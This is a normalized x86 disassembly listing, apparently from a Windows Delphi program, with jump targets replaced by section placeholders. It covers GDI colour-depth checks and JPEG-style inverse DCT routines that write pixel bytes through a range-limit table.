mov eax [ eax + 0x24 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edi eax
mov [ ebx + 0x8 ] edi
mov eax edi
mov edx esi
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_43eb18
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi rw-data
lea edi [ ebp - 0x7c ]
mov ecx 0x1d
[ edi ] [ esi ]
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x23e ] eax
lea eax [ ebp - 0x23e ]
mov ecx 0x1c2
mov edx 0x3d
call sub_4598ec
xor eax eax
push ebp
push j_sub_44c770#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43eaa4
mov edx [ ebx + 0x8 ]
lea eax [ ebp - 0x23e ]
call sub_45b094
lea eax [ ebp - 0x23e ]
or edx 0xffffffff
call sub_459bf0
mov eax [ ebp - 0x226 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp - 0x222 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x21a ] 0x1
sete al
mov [ ebx + 0x14 ] al
lea eax [ ebp - 0x23e ]
call sub_459d3c
neg eax
sbb eax eax
neg eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x39 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x23e ]
call sub_4599b4
retn
sub_46b60c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_46af1c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46b638
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46b410
mov eax [ ebx + 0x20 ]
mov ebx [ eax + 0x8 ]
mov eax ebx
call sub_43eac4
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop esi
pop ebx
retn
sub_46b664
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push j_sub_44c770#3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44e378
mov eax [ ebp - 0x4 ]
call sub_46a3f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b6a9
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
sub_46b6ac
push ebx
push esi
push edi
mov esi edx
mov edi eax
cmp esi [ edi + 0x30 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ edi + 0x24 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp esi eax
jne r-xdata
mov ebx eax
test bl bl
je r-xdata
mov al 0x1
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov eax edi
call sub_46add8
mov [ edi + 0x30 ] esi
test bl bl
je r-xdata
push eax
call DeleteObject
mov [ edi + 0x1a ] 0x1
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_46b704
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push j_sub_44c770#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44e378
mov eax [ ebp - 0x4 ]
call sub_46a3f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b749
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
sub_46b74c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax [ ebx + 0x20 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0x8 ]
cmp [ esp ] 0x0
jle r-xdata
mov eax edi
call sub_43eac4
mov [ esp ] eax
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ esp ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_46b79c
push ebx
push esi
push 0x0
call GetDC
mov ebx eax
push 0xc
push ebx
call GetDeviceCaps
mov esi eax
push 0xe
push ebx
call GetDeviceCaps
imul esi eax
cmp esi 0x8
jg r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
push ebx
push 0x0
call ReleaseDC
pop esi
pop ebx
retn
sub_46b7dc
push ebp
mov ebp esp
add esp 0xfffffeb0
push ebx
push esi
push edi
mov edi 0x8
mov eax [ eax + 0x136 ]
lea ebx [ ebp - 0x150 ]
add eax 0x80
mov [ ebp - 0x48 ] eax
mov eax ecx
mov edx [ edx + 0x50 ]
fild [ eax ]
fmul [ edx ]
fstp [ ebp - 0x4 ]
fild [ eax + 0x20 ]
fmul [ edx + 0x40 ]
fstp [ ebp - 0x8 ]
fild [ eax + 0x40 ]
fmul [ edx + 0x80 ]
fstp [ ebp - 0xc ]
fild [ eax + 0x60 ]
fmul [ edx + 0xc0 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0xc ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0xc ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x10 ]
fmul [ r-xdata ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
fild [ eax + 0x10 ]
fmul [ edx + 0x20 ]
fstp [ ebp - 0x14 ]
fild [ eax + 0x30 ]
fmul [ edx + 0x60 ]
fstp [ ebp - 0x18 ]
fild [ eax + 0x50 ]
fmul [ edx + 0xa0 ]
fstp [ ebp - 0x1c ]
fild [ eax + 0x70 ]
fmul [ edx + 0xe0 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x1c ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x44 ]
fld [ ebp - 0x1c ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x38 ]
fld [ ebp - 0x14 ]
fadd [ ebp - 0x20 ]
fstp [ ebp - 0x3c ]
fld [ ebp - 0x14 ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r-xdata ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r-xdata ]
fstp [ ebp - 0x34 ]
fld [ r-xdata ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r-xdata ]
fmul [ ebp - 0x38 ]
add eax 0x2
add edx 0x4
fadd [ ebp - 0x34 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x20 ]
fstp [ ebx ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
fstp [ ebx + 0xe0 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
fstp [ ebx + 0x20 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
fstp [ ebx + 0xc0 ]
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
fstp [ ebx + 0x40 ]
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
fstp [ ebx + 0xa0 ]
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
fstp [ ebx + 0x80 ]
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
fstp [ ebx + 0x60 ]
add ebx 0x4
fild [ eax ]
add eax 0x2
fmul [ edx ]
add edx 0x4
fstp [ ebp - 0x4c ]
mov ecx [ ebp - 0x4c ]
mov [ ebx ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x20 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x40 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x60 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0x80 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xa0 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xc0 ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xe0 ] ecx
add ebx 0x4
jmp r-xdata
mov cx [ eax + 0x10 ]
or cx [ eax + 0x20 ]
or cx [ eax + 0x30 ]
or cx [ eax + 0x40 ]
or cx [ eax + 0x50 ]
or cx [ eax + 0x60 ]
or cx [ eax + 0x70 ]
jne r-xdata
mov eax [ ebp + 0xc ]
lea ebx [ ebp - 0x150 ]
mov edx eax
xor edi edi
mov [ ebp - 0x50 ] edx
dec edi
test edi edi
jg r-xdata
mov ecx [ ebp - 0x50 ]
fld [ ebx ]
fadd [ ebx + 0x10 ]
mov esi [ ecx ]
add esi [ ebp + 0x8 ]
fstp [ ebp - 0x24 ]
fld [ ebx ]
fsub [ ebx + 0x10 ]
fstp [ ebp - 0x28 ]
fld [ ebx + 0x8 ]
fadd [ ebx + 0x18 ]
fstp [ ebp - 0x30 ]
fld [ ebx + 0x8 ]
fsub [ ebx + 0x18 ]
fmul [ r-xdata ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
fld [ ebx + 0x14 ]
fadd [ ebx + 0xc ]
fstp [ ebp - 0x44 ]
fld [ ebx + 0x14 ]
fsub [ ebx + 0xc ]
fstp [ ebp - 0x38 ]
fld [ ebx + 0x4 ]
fadd [ ebx + 0x1c ]
fstp [ ebp - 0x3c ]
fld [ ebx + 0x4 ]
fsub [ ebx + 0x1c ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r-xdata ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r-xdata ]
fstp [ ebp - 0x34 ]
fld [ r-xdata ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r-xdata ]
fmul [ ebp - 0x38 ]
fadd [ ebp - 0x34 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x20 ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi ] cl
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x7 ] cl
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x1 ] cl
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x6 ] cl
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x2 ] cl
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x5 ] cl
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
call sub_46a384
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov edx [ ebp - 0x48 ]
mov cl [ edx + eax ]
mov [ esi + 0x4 ] cl
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
call sub_46a384
add eax 0x4
mov edx [ ebp - 0x48 ]
sar eax 0x3
add ebx 0x20
and eax 0x3ff
inc edi
mov cl [ edx + eax ]
mov [ esi + 0x3 ] cl
add [ ebp - 0x50 ] 0x4
cmp edi 0x8
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46bc0c
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x136 ]
add edx 0x80
mov [ ebp - 0x38 ] edx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x140 ]
mov [ ebp - 0x3c ] 0x8
movsx ecx [ edx ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx ]
mov [ ebp - 0x10 ] ecx
movsx ecx [ edx + 0x20 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x40 ]
mov [ ebp - 0x14 ] ecx
movsx ecx [ edx + 0x40 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x80 ]
mov [ ebp - 0x18 ] ecx
movsx ecx [ edx + 0x60 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0xc0 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x10 ]
mov ebx [ ebp - 0x10 ]
mov esi [ ebp - 0x14 ]
add ebx [ ebp - 0x18 ]
sub ecx [ ebp - 0x18 ]
add esi [ ebp - 0x1c ]
mov [ ebp - 0x28 ] esi
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x28 ]
sub esi [ ebp - 0x1c ]
imul esi esi 0x16a
sar esi 0x8
add edi ebx
sub esi [ ebp - 0x28 ]
mov [ ebp - 0x10 ] edi
sub ebx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ebx
lea ebx [ esi + ecx ]
sub ecx esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ecx
movsx ecx [ edx + 0x10 ]
mov ebx [ ebp - 0x34 ]
imul ecx [ ebx + 0x20 ]
mov [ ebp - 0x20 ] ecx
movsx ecx [ edx + 0x30 ]
mov ebx [ ebp - 0x34 ]
mov edi [ ebp - 0x34 ]
movsx esi [ edx + 0x50 ]
imul ecx [ ebx + 0x60 ]
mov ebx [ ebp - 0x34 ]
imul esi [ ebx + 0xa0 ]
movsx ebx [ edx + 0x70 ]
imul ebx [ edi + 0xe0 ]
mov [ ebp - 0x24 ] ebx
lea ebx [ ecx + esi ]
sub esi ecx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x24 ]
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x24 ]
add edx 0x2
mov [ ebp - 0x30 ] edi
lea edi [ ebx + ecx ]
sub ecx ebx
mov [ ebp - 0x24 ] edi
mov ebx [ ebp - 0x30 ]
imul ecx ecx 0x16a
add ebx esi
imul esi esi 0xfffffd63
mov edi ebx
shl ebx 0x4
sub ebx edi
shl ebx 0x2
sub ebx edi
sar esi 0x8
sar ecx 0x8
lea ebx [ edi + ebx * 8 ]
sar ebx 0x8
mov [ ebp - 0x2c ] ebx
add esi [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
mov edi ebx
sub esi [ ebp - 0x24 ]
shl ebx 0x4
sub ecx esi
add ebx edi
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 4 ]
sar ebx 0x8
sub ebx [ ebp - 0x2c ]
lea ebx [ ecx + ebx ]
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x24 ]
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
sub ebx [ ebp - 0x24 ]
mov [ eax + 0xe0 ] ebx
mov ebx [ ebp - 0x14 ]
add ebx esi
mov [ eax + 0x20 ] ebx
mov ebx [ ebp - 0x14 ]
sub ebx esi
mov [ eax + 0xc0 ] ebx
mov ebx [ ebp - 0x18 ]
add ebx ecx
mov [ eax + 0x40 ] ebx
mov ebx [ ebp - 0x18 ]
sub ebx ecx
mov [ eax + 0xa0 ] ebx
mov ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x20 ]
mov [ eax + 0x80 ] ecx
mov ecx [ ebp - 0x1c ]
sub ecx [ ebp - 0x20 ]
mov [ eax + 0x60 ] ecx
add [ ebp - 0x34 ] 0x4
add eax 0x4
movsx ecx [ edx ]
mov ebx [ ebp - 0x34 ]
add edx 0x2
imul ecx [ ebx ]
mov [ eax ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x60 ] ecx
mov [ eax + 0x80 ] ecx
mov [ eax + 0xa0 ] ecx
mov [ eax + 0xc0 ] ecx
mov [ eax + 0xe0 ] ecx
add [ ebp - 0x34 ] 0x4
add eax 0x4
jmp r-xdata
mov cx [ edx + 0x10 ]
or cx [ edx + 0x20 ]
or cx [ edx + 0x30 ]
or cx [ edx + 0x40 ]
or cx [ edx + 0x50 ]
or cx [ edx + 0x60 ]
or cx [ edx + 0x70 ]
jne r-xdata
lea eax [ ebp - 0x140 ]
xor edx edx
mov [ ebp - 0x3c ] edx
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x40 ] ecx
dec [ ebp - 0x3c ]
cmp [ ebp - 0x3c ] 0x0
jg r-xdata
mov ecx [ eax ]
mov esi [ eax + 0x10 ]
mov ebx ecx
sub ecx esi
add ebx esi
mov esi [ eax + 0x8 ]
mov edi esi
add edi [ eax + 0x18 ]
mov [ ebp - 0x28 ] edi
sub esi [ eax + 0x18 ]
imul esi esi 0x16a
sar esi 0x8
mov edi [ ebp - 0x28 ]
sub esi [ ebp - 0x28 ]
add edi ebx
mov [ ebp - 0x10 ] edi
sub ebx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ebx
lea ebx [ esi + ecx ]
sub ecx esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ecx
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x4 ]
mov ebx ecx
mov esi ecx
mov ecx [ eax + 0x4 ]
add ecx [ eax + 0x1c ]
add ebx [ eax + 0xc ]
sub esi [ eax + 0xc ]
sub edi [ eax + 0x1c ]
mov [ ebp - 0x30 ] edi
lea edi [ ebx + ecx ]
sub ecx ebx
mov [ ebp - 0x24 ] edi
mov ebx [ ebp - 0x30 ]
imul ecx ecx 0x16a
add ebx esi
imul esi esi 0xfffffd63
mov edi ebx
shl ebx 0x4
sub ebx edi
shl ebx 0x2
sub ebx edi
sar esi 0x8
sar ecx 0x8
lea ebx [ edi + ebx * 8 ]
sar ebx 0x8
mov [ ebp - 0x2c ] ebx
add esi [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
mov edi ebx
sub esi [ ebp - 0x24 ]
shl ebx 0x4
sub ecx esi
add ebx edi
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 4 ]
sar ebx 0x8
sub ebx [ ebp - 0x2c ]
lea ebx [ ecx + ebx ]
mov [ ebp - 0x20 ] ebx
mov ebx [ ebp - 0x10 ]
mov edi [ ebp - 0x38 ]
add ebx [ ebp - 0x24 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx ] bl
mov ebx [ ebp - 0x10 ]
mov edi [ ebp - 0x38 ]
sub ebx [ ebp - 0x24 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx + 0x7 ] bl
mov ebx [ ebp - 0x14 ]
mov edi [ ebp - 0x38 ]
add ebx esi
sar ebx 0x5
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0x14 ]
sub ebx esi
mov esi [ ebp - 0x38 ]
sar ebx 0x5
and ebx 0x3ff
mov bl [ esi + ebx ]
mov [ edx + 0x6 ] bl
mov ebx [ ebp - 0x18 ]
mov esi [ ebp - 0x38 ]
add ebx ecx
sar ebx 0x5
and ebx 0x3ff
mov bl [ esi + ebx ]
mov [ edx + 0x2 ] bl
mov ebx [ ebp - 0x18 ]
sub ebx ecx
mov ecx [ ebp - 0x38 ]
sar ebx 0x5
and ebx 0x3ff
mov cl [ ecx + ebx ]
mov [ edx + 0x5 ] cl
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x38 ]
add ecx [ ebp - 0x20 ]
sar ecx 0x5
and ecx 0x3ff
mov cl [ ebx + ecx ]
mov [ edx + 0x4 ] cl
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x38 ]
sub ecx [ ebp - 0x20 ]
sar ecx 0x5
and ecx 0x3ff
add eax 0x20
mov cl [ ebx + ecx ]
mov [ edx + 0x3 ] cl
mov ecx [ eax ]
sar ecx 0x5
and ecx 0x3ff
mov ebx [ ebp - 0x38 ]
mov cl [ ebx + ecx ]
mov [ edx ] cl
mov [ edx + 0x1 ] cl
mov [ edx + 0x2 ] cl
mov [ edx + 0x3 ] cl
mov [ edx + 0x4 ] cl
mov [ edx + 0x5 ] cl
mov [ edx + 0x6 ] cl
mov [ edx + 0x7 ] cl
add eax 0x20
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x40 ]
or ecx [ eax + 0x8 ]
or ecx [ eax + 0xc ]
mov edx [ edx ]
or ecx [ eax + 0x10 ]
add edx [ ebp + 0x8 ]
or ecx [ eax + 0x14 ]
or ecx [ eax + 0x18 ]
or ecx [ eax + 0x1c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc [ ebp - 0x3c ]
add [ ebp - 0x40 ] 0x4
cmp [ ebp - 0x3c ] 0x8
jl r-xdata
sub_46c018
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
mov eax [ eax + 0x136 ]
add eax 0x80
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x28 ] ecx
mov edx [ edx + 0x50 ]
mov [ ebp - 0x2c ] edx
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x38 ] 0x8
mov edx [ ebp - 0x28 ]
movsx ecx [ edx + 0x20 ]
mov edx [ ebp - 0x2c ]
imul ecx [ edx + 0x40 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x28 ]
mov esi [ ebp - 0x1c ]
movsx edx [ ecx + 0x60 ]
mov ecx [ ebp - 0x2c ]
imul edx [ ecx + 0xc0 ]
mov ecx [ ebp - 0x1c ]
add ecx edx
mov ebx ecx
shl ebx 0x4
add ebx ecx
lea ebx [ ecx + ebx * 4 ]
lea ebx [ ecx + ebx * 4 ]
shl ebx 0x4
add ebx ecx
mov ecx edx
neg ecx
shl ecx 0x4
add ecx edx
lea ecx [ edx + ecx * 4 ]
shl ecx 0x3
sub ecx edx
shl ecx 0x5
sub ecx edx
mov edx esi
add ecx ebx
lea esi [ edx + esi * 2 ]
shl esi 0x4
add esi edx
shl esi 0x6
sub esi edx
mov edx [ ebp - 0x28 ]
add esi esi
movsx edx [ edx ]
add esi ebx
mov ebx [ ebp - 0x2c ]
imul edx [ ebx ]
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x28 ]
mov ebx [ ebp - 0x2c ]
movsx edx [ edx + 0x40 ]
imul edx [ ebx + 0x80 ]
mov ebx [ ebp - 0x1c ]
add ebx edx
shl ebx 0xd
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x1c ]
sub ebx edx
shl ebx 0xd
mov [ ebp - 0x8 ] ebx
mov edx [ ebp - 0x4 ]
add edx esi
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
sub edx esi
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
sub edx ecx
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x28 ]
movsx edx [ ecx + 0x70 ]
mov ecx [ ebp - 0x2c ]
imul edx [ ecx + 0xe0 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x28 ]
movsx ecx [ edx + 0x50 ]
mov edx [ ebp - 0x2c ]
imul ecx [ edx + 0xa0 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x2c ]
mov ebx [ ebp - 0x4 ]
movsx ecx [ ecx + 0x30 ]
imul ecx [ edx + 0x60 ]
mov edx [ ebp - 0x28 ]
movsx esi [ edx + 0x10 ]
mov edx [ ebp - 0x2c ]
imul esi [ edx + 0x20 ]
mov edx [ ebp - 0x8 ]
add ebx esi
add edx ecx
imul ebx ebx 0xffffe333
mov [ ebp - 0x1c ] edx
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add edi esi
add edx ecx
mov [ ebp - 0x20 ] edi
imul ecx ecx 0x6254
mov edi [ ebp - 0x20 ]
add edi edx
imul edi edi 0x25a1
mov [ ebp - 0x24 ] edi
imul edi [ ebp - 0x4 ] 0x98e
mov [ ebp - 0x4 ] edi
imul edi [ ebp - 0x8 ] 0x41b3
mov [ ebp - 0x8 ] edi
mov edi esi
lea esi [ edi + esi * 2 ]
shl esi 0x9
add esi edi
lea esi [ edi + esi * 4 ]
lea esi [ edi + esi * 2 ]
imul edi [ ebp - 0x1c ] 0xffffadfd
mov [ ebp - 0x1c ] edi
mov edi edx
neg edx
shl edx 0x6
add edx edi
lea edx [ edi + edx * 4 ]
shl edx 0x4
sub edx edi
shl edx 0x2
sub edx edi
imul edi [ ebp - 0x20 ] 0xfffff384
mov [ ebp - 0x20 ] edi
add edx [ ebp - 0x24 ]
mov edi [ ebp - 0x24 ]
add [ ebp - 0x20 ] edi
lea edi [ edx + ebx ]
add [ ebp - 0x4 ] edi
mov edi [ ebp - 0x1c ]
add edi [ ebp - 0x20 ]
add [ ebp - 0x8 ] edi
add edx [ ebp - 0x1c ]
add ebx [ ebp - 0x20 ]
add ecx edx
add esi ebx
mov edx [ ebp - 0xc ]
add edx esi
add edx 0x400
sar edx 0xb
mov [ eax ] edx
mov edx [ ebp - 0xc ]
sub edx esi
add edx 0x400
sar edx 0xb
mov [ eax + 0xe0 ] edx
mov edx [ ebp - 0x10 ]
add edx ecx
add edx 0x400
sar edx 0xb
mov [ eax + 0x20 ] edx
mov edx [ ebp - 0x10 ]
sub edx ecx
add edx 0x400
sar edx 0xb
mov [ eax + 0xc0 ] edx
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x8 ]
add ecx 0x400
sar ecx 0xb
mov [ eax + 0x40 ] ecx
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x8 ]
add edx 0x400
sar edx 0xb
mov [ eax + 0xa0 ] edx
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x4 ]
add ecx 0x400
sar ecx 0xb
mov [ eax + 0x60 ] ecx
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x4 ]
add edx 0x400
sar edx 0xb
mov [ eax + 0x80 ] edx
add [ ebp - 0x28 ] 0x2
add [ ebp - 0x2c ] 0x4
add eax 0x4
mov ecx [ ebp - 0x28 ]
movsx edx [ ecx ]
mov ecx [ ebp - 0x2c ]
imul edx [ ecx ]
shl edx 0x2
mov [ eax ] edx
mov [ eax + 0x20 ] edx
